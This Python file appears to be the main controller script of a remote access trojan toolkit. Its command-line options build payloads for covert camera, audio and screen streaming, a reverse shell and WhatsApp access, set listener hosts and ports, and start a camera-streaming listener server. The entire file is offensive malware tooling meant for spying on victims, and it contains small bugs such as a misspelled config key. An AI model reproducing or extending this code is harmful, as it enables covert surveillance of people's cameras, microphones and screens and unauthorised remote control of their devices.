"""
    this code created by 0RaMsY0
"""
#main host for everything
LHOST = ""
#payload configuration veriables
P_LPORT_SOCKET = ""
P_LPORT_CameraStreaming = ""
P_LPORT_ScreenSharing = ""
P_LPORT_ReverseShell = ""
P_LPORT_Whatsapp = ""
#defin the __SET__value to run the right payload maker
SET_VALUE = ""

import argparse
import time, os, sys
from server.name import SERVER_TYPES
from payloads.name import PAYLOADS_TYPES
from assets.colors import colors
from assets.symbols import Sminess, Splus, Swarning, Ssowrd
from errors.WarningHandler import * #error handler you will find the script in warnings\WarningHandler.py directory
import json
from configparser import ConfigParser
import socket
from payloads.makers.CameraStreamingPayloadMaker import * #this just the CameraStreaming payload maker and wee are import the class that makes the paylaod
from server.types.CameraStreaming import run as CameraStreamingStart
#setting colors
from colorama import init
CR = colors #colors class from assets/colors.py
init()
#configs editing
CONFIG_PARSER = ConfigParser()

#command line args
PARSER = argparse.ArgumentParser()
PARSER.add_argument("-s", "--show", help="take an argument [servers, payloads]")
PARSER.add_argument("-u", "--use" , help="command to start a server [take an argument]")
PARSER.add_argument("-S", "--set", help="command for creating a payload [take an argument]")
PARSER.add_argument("-t", "--target", help="commmand to see targets info [take an argument]")
PARSER.add_argument("-sh", "--SocketLhost", help="command for setting the lhost [automatic chose by default from config.json]")
PARSER.add_argument("-sp", "--SocketLport", help="command for setting the lport [automatic chose by default from config.json]")
PARSER.add_argument("-n", "--name", help="command to setup a costume payload name")
PARSER.add_argument("-csp", "--CameraStreamingPort", help="command for chosing a costume CameraStreaming port [automatic chose by default from config.json]")
PARSER.add_argument("-ssp", "--ScreenStreamingPort", help="command for chosing a costume ScreenStreaming port [automatic chose by default from config.json]")
PARSER.add_argument("-rsp", "--ReverseShellPort", help="command for chosing a costume ReverseShellPort port [automatic chose by default from config.json]")
PARSER.add_argument("-asp", "--AudioStreamingPort", help="command for chosing a costume AudioStreamingPort port [automatic chose by default from config.json]")
PARSER.add_argument("-i", "--injection", help="command to enable the injection that allows you to send multipule payload to one created one [argument => True | False]")
ARGS = PARSER.parse_args()
#main args
__SHOW__ = ARGS.show
__USE__ = ARGS.use
__SET__ = ARGS.set
__TARGET__ = ARGS.target
__NAME__ = ARGS.name
#injection auto
__injection__ = ARGS.injection
#settings args for "set" and "use" argument
__SocketLhost__ = ARGS.SocketLhost
__SocketLport__ = ARGS.SocketLport
__CameraStreamingPort__ = ARGS.CameraStreamingPort
__ScreenStreamingPort__ = ARGS.ScreenStreamingPort 
__ReverseShellPort__ = ARGS.ScreenStreamingPort
__AudioStreamingPort__ = ARGS.AudioStreamingPort
if __SHOW__:
    if __SHOW__ == "servers":
        print(F"\r {Splus} {CR.green()}Server:")
        for x in SERVER_TYPES:
            print(" "*5 +f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
    elif __SHOW__ == "payloads" :
        print(F"\r {Splus} {CR.green()}Payloads:")
        for x in PAYLOADS_TYPES:
            print(" "*5 + f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
    else:
        InvaliedEntry(
            element = "show"
        )

if __SET__:
    """
    checking for what __SET__ [payload]
    type have being chosing by the user
    """
    with open("config.json", "r") as JSON_CONF:
        CONFIG_LOAD = json.load(JSON_CONF)
        if CONFIG_LOAD["PayloadConfig"]["lhost"]:
            LHOST = socket.gethostbyname(socket.gethostname()) if CONFIG_LOAD["PayloadConfig"]["lhost"] == "auto" else CONFIG_LOAD["PayloadConfig"]["lhost"]
        else:
            pass
        if __SocketLhost__:
            LHOST = __SocketLhost__
        else:
            pass
        if LHOST:
            pass
        else:
            NoLhostSpec()
        P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
        if __SET__ == PAYLOADS_TYPES[0]: #CameraStreaming
            __CameraStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
        elif __SET__ == PAYLOADS_TYPES[1]:  #AudioStreaming
            __AudioStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] else __AudioStreamingPort__ if __AudioStreamingPort__ else NoAudioStreamingPortSpec()
        elif __SET__ == PAYLOADS_TYPES[2]: #ScreenStreaming
            __ScreenStreamingPort__ = CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] if CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] else __ScreenStreamingPort__ if __ScreenStreamingPort__ else NoScreenStreamingPortSpec()
        elif __SET__ == PAYLOADS_TYPES[3]: #ReverseShell
            __ReverseShellPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] else __ReverseShellPort__ if __ReverseShellPort__ else NoReverShellPort()

elif __USE__:
    """
    starting the server that 
    the user has chossed
    """
    with open("config.json", "r") as JSON_CONF:
        CONFIG_LOAD = json.load(JSON_CONF)
        if CONFIG_LOAD["ServerConfig"]["lhost"]:
            LHOST = socket.gethostbyname(socket.gethostname()) if CONFIG_LOAD["ServerConfig"]["lhost"] == "auto" else CONFIG_LOAD["ServerConfig"]["lhost"]
        else:
            pass
        if __SocketLhost__:
            LHOST = __SocketLhost__
        else:
            pass
        if LHOST:
            pass
        else:
            NoLhostSpec()
        P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
    if __USE__ == SERVER_TYPES[0]:
        P_LPORT_CameraStreaming = CONFIG_LOAD["ServerConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["ServerConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
        CONFIG_FILE = "server/setting/CS-config.ini"
        CONFIG_PARSER.read(CONFIG_FILE)
        CONFIG_PARSER.add_section("CameraStreaming")
        CONFIG_PARSER.set("CameraStreaming", "lhost", f"{LHOST}")
        CONFIG_PARSER.set("CameraStreaming", "SocketPort", f"{P_LPORT_SOCKET}")
        CONFIG_PARSER.set("CameraStreaming", "CameraStreamingPort", f"{P_LPORT_CameraStreaming}")
        with open(CONFIG_FILE, "w") as CONFIG_DES:
            CONFIG_PARSER.write(CONFIG_DES)
        print(f"{Ssowrd} {CR.red()}Note: {CR.yellow()}make sure to start a tcp tunnel for server")
        input("")
        CameraStreamingStart()
        #os.system("python server/types/CameraStreaming.py")